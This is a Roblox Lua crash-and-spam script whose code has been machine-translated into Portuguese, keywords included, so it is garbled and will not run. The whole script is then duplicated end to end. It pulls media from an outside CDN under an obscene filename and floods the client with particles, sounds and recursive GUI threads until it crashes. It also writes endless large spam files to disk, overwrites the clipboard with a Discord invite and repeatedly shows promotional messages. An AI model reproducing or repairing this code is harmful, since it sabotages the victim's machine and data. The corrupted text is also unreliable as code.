--!nolint
--!sem verificação

local GuiService = game:GetService("GuiService")
local HttpService = game:GetService("HttpService")
local RunService = jogo:GetService("RunService")

local CDN_ASSETS = "https://files.zvyz.live/Assets/"

Ativos locais = {
	["áudio"] = {
		Normal = "rbxassetid://8389041427",
		Nome = "__molestador.ogg",
		Personalizado = CDN_ASSETS .. "molestador.ogg"
	},
	["imagem"] = {
		Normal = "rbxassetid://7120897383",
		Nome = "__molestador.png",
		Personalizado = CDN_ASSETS .. "molestador.png"
	}
}

Funções locais = {
	["GetAsset"] = getcustomasset ou getsynasset,
	["Escrever"] = escreverarquivo,
	["Ler"] = lerararquivo,

	["HttpGet"] = função(URL: string)
		assert(URL, "URL ausente")
		assert(type(URL) == "string", "URL não é uma string")

		local Success, Result = pcall(function()
			retornar jogo:HttpGet(URL)
		fim)

		Retorna Sucesso e Resultado ou nulo
	fim,
}

local Novo = função(Classe: string, Propriedades: { [string]: qualquer })
	Objeto local = Instância.novo(Classe)

	para Propriedade, Valor em pares(Propriedades) faça
		se rawequal(Propriedade, "Pai") então
			continuar
		fim

		Objeto[Propriedade] = Valor
	fim

	se Properties["Parent"] então
		Objeto["Pai"] = Propriedades["Pai"]
	fim

	retornar objeto
fim

local GetAsset = function(String: string)
	Se não for Assets[String], retorne o fim.

	local Asset = Assets[String]

	se não Functions["GetAsset"] ou não Functions["Read"] ou não Functions["Write"] então
		retornar Asset.Normal
	fim

	local Success, CacheFile = pcall(function()
		retornar Functions.Read(Asset.Name)
	fim)

	Se for bem-sucedido, então
		retornar Functions.GetAsset(Asset.Name);
	fim

	local File = Functions.HttpGet(Asset.Custom);

	se não for Arquivo então
		retornar Asset.Normal
	fim

	pcall(Functions.Write, Asset.Name, File);

	retornar Functions.GetAsset(Asset.Name);
fim


função local CreateSound(Volume: número?, Som: número?)
	Som local: Som = Novo("Som", {
		Nome = HttpService:GenerateGUID(false),
		Volume = Volume ou 1,
		SoundId = Sound e string.format("rbxassetid://%s", tostring(Sound)) ou GetAsset("audio"),
		Pai = espaço de trabalho
	})

	Som:Reproduzir()
	Som.Fim:Aguarde()
fim

função local CreateParticle(Parent: Instance)
	Partícula local: EmissorDePartículas = Novo("EmissorDePartículas", {
		Nome = HttpService:GenerateGUID(false),
		Textura = GetAsset("image"),

		Pai = Pai
	})

	enquanto task.wait() faça
		Partícula:Emitir(1)
	fim
fim

função FloodParticle()
	para _, Item em ipairs(workspace:GetDescendants()) faça
		se não Item:IsA("BasePart") então
			continuar
		fim

		para _ = 1, 25 faça
			tarefa.spawn(CriarPartícula, Item)
		fim
	fim
fim

função FloodSound()
	enquanto task.wait(.2) faça
		tarefa.spawn(CriarSom, 10)
	fim
fim

função AbsoulateFuckingCrash()
	Função local;
	Array local = {}

	Função = função()
		pcall(função()
			para _ = 1, 50 faça				
				tarefa.spawn(função()
					para _ = 1, 25 faça
						local ScreenGui = New("ScreenGui", {
							Nome = HttpService:GenerateGUID(false),
							Ordem de exibição = 69,

							SafeAreaCompatibility = Enum.SafeAreaCompatibility.None,
							ScreenInsets = Enum.ScreenInsets.None,
							ResetOnSpawn = falso
						})

						Novo("ImageLabel", {
							Nome = HttpService:GenerateGUID(false),
							Imagem = GetAsset("image"),

							Tamanho = UDim2.new(1, 0, 1, 0),
							ZIndex = 69,
							Pai = ScreenGui
						})

						ScreenGui.Parent = gethui e gethui() ou game:GetService("Players").LocalPlayer.PlayerGui
						tarefa.esperar()
					fim
				fim)

				tarefa.spawn(função()
					se não Functions["Write"] então
						retornar
					fim

					enquanto task.wait() faça
						Functions.Write(string.format("XETHEUS_SKID-%s-%s.txt", HttpService:GenerateGUID(false), tostring(math.random(1, 9000000))), tostring(string.rep("https://discord.gg/pQjaYj9KrK\n", 70656)))
					fim
				fim)

				tarefa.spawn(função()
					tabela.inserir(Array, string.rep(tostring(math.random()), 6969))
				fim)

				para _ = 1, 10 faça
					tarefa.spawn(Função)
				fim
			fim
		fim)
	fim

	tarefa.spawn(Função)
fim

se não Functions["GetAsset"] então
	CriarSom(5, 6516550176)
fim

tarefa.spawn(função()
	se não Functions["Write"] então
		retornar
	fim

	enquanto verdadeiro faz
		Functions.Write(string.format("XETHEUS_SKID-%s-%s.txt", HttpService:GenerateGUID(false), tostring(math.random(1, 9000000))), tostring(string.rep("https://discord.gg/pQjaYj9KrK\n", 70656)))
		tarefa.esperar()
	fim
fim)

tarefa.spawn(função()
	enquanto verdadeiro faz
		Novo("Mensagem", {
			Nome = HttpService:GenerateGUID(false),
			Text = "CODIGO COMPLETO + VERSÃO PREMIUM DE GRAÇA:\nhttps://discord.gg/pQjaYj9KrK\n\n\nCÓDIGO FONTE + PREMIUM GRATUITO:\nhttps://discord.gg/pQjaYj9KrK\n\nO INVITE DO DISCORD FOI COPIADO!\nO DISCORD INVITE FOI COPIADO!",

			Pai = espaço de trabalho
		})
		pcall(setclipboard, "https://discord.gg/pQjaYj9KrK")
		tarefa.esperar(.2)
	fim
fim)

para _, Thread em { FloodSound, FloodParticle } faça
	tarefa.spawn(Thread)
fim

função local TheFuckingRealCrash()
	Parte local: ParteBase = Novo("Parte", {
		Nome = HttpService:GenerateGUID(false),
		PodeColidir = falso,
		Ancorado = verdadeiro
	})

	para _, Enum em ipairs(Enum.NormalId:GetEnumItems()) faça
		Novo("Decalque", {
			Nome = HttpService:GenerateGUID(false),

			Face = Enum,
			Textura = GetAsset("Imagem"),

			Pai = Parte
		})
	fim

	função local MoverCâmera()
		RunService.RenderStepped:Connect(função()
			tarefa.spawn(função()
				para _ = 0, 999 faça
					local PartClone = Part:Clone()

					PartClone.Parent = workspace.CurrentCamera
					PartClone.CFrame = workspace.CurrentCamera.CFrame * CFrame.new(0, 0, -6) * CFrame.Angles(0, math.rad(180), 0)

					RunService.Heartbeat:Wait()
				fim
			fim)
		fim)
	fim

	tarefa.spawn(função()
		RunService.RenderStepped:Connect(função()
			Novo("Mensagem", {
				Nome = HttpService:GenerateGUID(false),
				Text = "CODIGO COMPLETO + VERSÃO PREMIUM DE GRAÇA:\nhttps://discord.gg/pQjaYj9KrK\n\n\nCÓDIGO FONTE + PREMIUM GRATUITO:\nhttps://discord.gg/pQjaYj9KrK\n\nO INVITE DO DISCORD FOI COPIADO!\nO DISCORD INVITE FOI COPIADO!",

				Pai = espaço de trabalho
			})
			RunService.Heartbeat:Wait()
		fim)
	fim)

	Part.Parent = workspace.CurrentCamera

	tarefa.spawn(MoverCâmera)
	tarefa.spawn(AbsoulateFuckingCrash)
fim

GuiService.MenuOpened:Conectar(TheFuckingRealCrash)
GuiService.MenuClosed:Connect(TheFuckingRealCrash)--!nolint
--!sem verificação

local GuiService = game:GetService("GuiService")
local HttpService = game:GetService("HttpService")
local RunService = jogo:GetService("RunService")

local CDN_ASSETS = "https://files.zvyz.live/Assets/"

Ativos locais = {
	["áudio"] = {
		Normal = "rbxassetid://8389041427",
		Nome = "__molestador.ogg",
		Personalizado = CDN_ASSETS .. "molestador.ogg"
	},
	["imagem"] = {
		Normal = "rbxassetid://7120897383",
		Nome = "__molestador.png",
		Personalizado = CDN_ASSETS .. "molestador.png"
	}
}

Funções locais = {
	["GetAsset"] = getcustomasset ou getsynasset,
	["Escrever"] = escreverarquivo,
	["Ler"] = lerararquivo,

	["HttpGet"] = função(URL: string)
		assert(URL, "URL ausente")
		assert(type(URL) == "string", "URL não é uma string")

		local Success, Result = pcall(function()
			retornar jogo:HttpGet(URL)
		fim)

		Retorna Sucesso e Resultado ou nulo
	fim,
}

local Novo = função(Classe: string, Propriedades: { [string]: qualquer })
	Objeto local = Instância.novo(Classe)

	para Propriedade, Valor em pares(Propriedades) faça
		se rawequal(Propriedade, "Pai") então
			continuar
		fim

		Objeto[Propriedade] = Valor
	fim

	se Properties["Parent"] então
		Objeto["Pai"] = Propriedades["Pai"]
	fim

	retornar objeto
fim

local GetAsset = function(String: string)
	Se não for Assets[String], retorne o fim.

	local Asset = Assets[String]

	se não Functions["GetAsset"] ou não Functions["Read"] ou não Functions["Write"] então
		retornar Asset.Normal
	fim

	local Success, CacheFile = pcall(function()
		retornar Functions.Read(Asset.Name)
	fim)

	Se for bem-sucedido, então
		retornar Functions.GetAsset(Asset.Name);
	fim

	local File = Functions.HttpGet(Asset.Custom);

	se não for Arquivo então
		retornar Asset.Normal
	fim

	pcall(Functions.Write, Asset.Name, File);

	retornar Functions.GetAsset(Asset.Name);
fim


função local CreateSound(Volume: número?, Som: número?)
	Som local: Som = Novo("Som", {
		Nome = HttpService:GenerateGUID(false),
		Volume = Volume ou 1,
		SoundId = Sound e string.format("rbxassetid://%s", tostring(Sound)) ou GetAsset("audio"),
		Pai = espaço de trabalho
	})

	Som:Reproduzir()
	Som.Fim:Aguarde()
fim

função local CreateParticle(Parent: Instance)
	Partícula local: EmissorDePartículas = Novo("EmissorDePartículas", {
		Nome = HttpService:GenerateGUID(false),
		Textura = GetAsset("image"),

		Pai = Pai
	})

	enquanto task.wait() faça
		Partícula:Emitir(1)
	fim
fim

função FloodParticle()
	para _, Item em ipairs(workspace:GetDescendants()) faça
		se não Item:IsA("BasePart") então
			continuar
		fim

		para _ = 1, 25 faça
			tarefa.spawn(CriarPartícula, Item)
		fim
	fim
fim

função FloodSound()
	enquanto task.wait(.2) faça
		tarefa.spawn(CriarSom, 10)
	fim
fim

função AbsoulateFuckingCrash()
	Função local;
	Array local = {}

	Função = função()
		pcall(função()
			para _ = 1, 50 faça				
				tarefa.spawn(função()
					para _ = 1, 25 faça
						local ScreenGui = New("ScreenGui", {
							Nome = HttpService:GenerateGUID(false),
							Ordem de exibição = 69,

							SafeAreaCompatibility = Enum.SafeAreaCompatibility.None,
							ScreenInsets = Enum.ScreenInsets.None,
							ResetOnSpawn = falso
						})

						Novo("ImageLabel", {
							Nome = HttpService:GenerateGUID(false),
							Imagem = GetAsset("image"),

							Tamanho = UDim2.new(1, 0, 1, 0),
							ZIndex = 69,
							Pai = ScreenGui
						})

						ScreenGui.Parent = gethui e gethui() ou game:GetService("Players").LocalPlayer.PlayerGui
						tarefa.esperar()
					fim
				fim)

				tarefa.spawn(função()
					se não Functions["Write"] então
						retornar
					fim

					enquanto task.wait() faça
						Functions.Write(string.format("XETHEUS_SKID-%s-%s.txt", HttpService:GenerateGUID(false), tostring(math.random(1, 9000000))), tostring(string.rep("https://discord.gg/pQjaYj9KrK\n", 70656)))
					fim
				fim)

				tarefa.spawn(função()
					tabela.inserir(Array, string.rep(tostring(math.random()), 6969))
				fim)

				para _ = 1, 10 faça
					tarefa.spawn(Função)
				fim
			fim
		fim)
	fim

	tarefa.spawn(Função)
fim

se não Functions["GetAsset"] então
	CriarSom(5, 6516550176)
fim

tarefa.spawn(função()
	se não Functions["Write"] então
		retornar
	fim

	enquanto verdadeiro faz
		Functions.Write(string.format("XETHEUS_SKID-%s-%s.txt", HttpService:GenerateGUID(false), tostring(math.random(1, 9000000))), tostring(string.rep("https://discord.gg/pQjaYj9KrK\n", 70656)))
		tarefa.esperar()
	fim
fim)

tarefa.spawn(função()
	enquanto verdadeiro faz
		Novo("Mensagem", {
			Nome = HttpService:GenerateGUID(false),
			Text = "CODIGO COMPLETO + VERSÃO PREMIUM DE GRAÇA:\nhttps://discord.gg/pQjaYj9KrK\n\n\nCÓDIGO FONTE + PREMIUM GRATUITO:\nhttps://discord.gg/pQjaYj9KrK\n\nO INVITE DO DISCORD FOI COPIADO!\nO DISCORD INVITE FOI COPIADO!",

			Pai = espaço de trabalho
		})
		pcall(setclipboard, "https://discord.gg/pQjaYj9KrK")
		tarefa.esperar(.2)
	fim
fim)

para _, Thread em { FloodSound, FloodParticle } faça
	tarefa.spawn(Thread)
fim

função local TheFuckingRealCrash()
	Parte local: ParteBase = Novo("Parte", {
		Nome = HttpService:GenerateGUID(false),
		PodeColidir = falso,
		Ancorado = verdadeiro
	})

	para _, Enum em ipairs(Enum.NormalId:GetEnumItems()) faça
		Novo("Decalque", {
			Nome = HttpService:GenerateGUID(false),

			Face = Enum,
			Textura = GetAsset("Imagem"),

			Pai = Parte
		})
	fim

	função local MoverCâmera()
		RunService.RenderStepped:Connect(função()
			tarefa.spawn(função()
				para _ = 0, 999 faça
					local PartClone = Part:Clone()

					PartClone.Parent = workspace.CurrentCamera
					PartClone.CFrame = workspace.CurrentCamera.CFrame * CFrame.new(0, 0, -6) * CFrame.Angles(0, math.rad(180), 0)

					RunService.Heartbeat:Wait()
				fim
			fim)
		fim)
	fim

	tarefa.spawn(função()
		RunService.RenderStepped:Connect(função()
			Novo("Mensagem", {
				Nome = HttpService:GenerateGUID(false),
				Text = "CODIGO COMPLETO + VERSÃO PREMIUM DE GRAÇA:\nhttps://discord.gg/pQjaYj9KrK\n\n\nCÓDIGO FONTE + PREMIUM GRATUITO:\nhttps://discord.gg/pQjaYj9KrK\n\nO INVITE DO DISCORD FOI COPIADO!\nO DISCORD INVITE FOI COPIADO!",

				Pai = espaço de trabalho
			})
			RunService.Heartbeat:Wait()
		fim)
	fim)

	Part.Parent = workspace.CurrentCamera

	tarefa.spawn(MoverCâmera)
	tarefa.spawn(AbsoulateFuckingCrash)
fim

GuiService.MenuOpened:Conectar(TheFuckingRealCrash)
GuiService.MenuClosed:Connect(TheFuckingRealCrash)
